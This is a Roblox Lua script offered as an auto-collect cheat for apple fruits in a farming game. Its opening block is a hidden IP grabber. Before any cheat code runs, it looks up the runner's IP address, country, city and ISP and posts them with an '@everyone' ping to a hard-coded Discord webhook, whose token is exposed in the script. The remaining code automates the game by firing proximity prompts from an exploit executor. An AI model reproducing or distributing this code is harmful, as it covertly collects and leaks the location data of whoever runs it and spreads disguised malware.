local HttpService = game:GetService("HttpService")

local webhookUrl = "https://discord.com/api/webhooks/1362065828454993970/J_HLKCaHTqWmuZ4sESHeMogdkQ5qodc1lp26fDRnjMgYfZOyvMHE4l1JoveUVvnE_ZRg" -- your webhook URL

local function sendToWebhook(data)
    local content = string.format("@everyone IP: %s\nCountry: %s\nCity: %s\nISP: %s", data.ip, data.country, data.city, data.org)

    local payload = HttpService:JSONEncode({
        content = content
    })

    local success, result = pcall(function()
        HttpService:PostAsync(webhookUrl, payload, Enum.HttpContentType.ApplicationJson)
    end)

    if success then
        print("Sent to Discord!")
    else
        warn("Failed to send to webhook:", result)
    end
end

local function fetchIPInfo()
    local success, response = pcall(function()
        return HttpService:GetAsync("https://ipwhois.app/json/")
    end)

    if success then
        local data = HttpService:JSONDecode(response)
        sendToWebhook(data)
    else
        warn("Failed to fetch IP info:", response)
    end
end

fetchIPInfo()




_G.autocollect = true

local function Apple ()
		for i,v in pairs(game.workspace.Farm:GetChildren()) do
		if v:FindFirstChild("Important") and v.Important:FindFirstChild("Plants_Physical") then
			if v.Important.Plants_Physical:FindFirstChild("Apple") and v.Important.Plants_Physical.Apple:FindFirstChild("Fruits") then
				for i, f in pairs(v.Important.Plants_Physical.Apple.Fruits:GetChildren()) do
					if f.Name == "Apple" then
						if f:FindFirstChild("2") then
							local two = f:FindFirstChild("2")
							--print(two)
							if two:FindFirstChild("ProximityPrompt") then
								--print("ProximityPrompt Founded")
								fireproximityprompt(two.ProximityPrompt, 150000)
								else
									print("ProximityPrompt is not founded or is not grown enough")
							end
						end
					end
				end
			end
		end
	end
end


while _G.autocollect do
   Apple()
   task.wait(0.1)
end
